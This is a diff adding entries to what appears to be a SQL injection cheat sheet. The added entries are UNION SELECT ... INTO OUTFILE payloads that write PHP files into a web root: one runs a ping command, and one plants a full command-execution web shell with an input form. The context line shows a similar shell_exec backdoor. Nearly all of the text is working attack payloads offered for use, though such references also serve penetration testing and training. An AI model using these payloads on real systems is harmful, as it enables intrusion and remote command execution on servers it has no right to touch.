@@ -251,6 +251,24 @@ Oracle
 `union all select 1,2,3,4,"<?php echo
 shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'`
 
+
+Create a file to execute a single command:
+
+```
+" union select "<?php system(\"ping -c 4 10.10.10.60\");","","","","","" into outfile "/var/www/html/filename.php" #
+```
+Make the output prettier:
+
+```
+" union select "<?php system(\"echo '<pre>'; ping -c 4 10.10.10.60\");","","","","","" into outfile "/var/www/html/filename.php" #
+```
+Make a command injection page:
+
+```
+" union select "<?php if (isset($_REQUEST['cmd'])){ echo '<pre>'; system($_REQUEST['cmd']); echo '</pre>'; } ?><form action=<?php echo basename($_SERVER['PHP_SELF'])?>> <input type=text name=cmd size=20> <input type=submit></form>","","","","","" into outfile "/var/www/html/filename.php" #
+```
+
+
 ## Blind  
 ### Conditional Responses
 
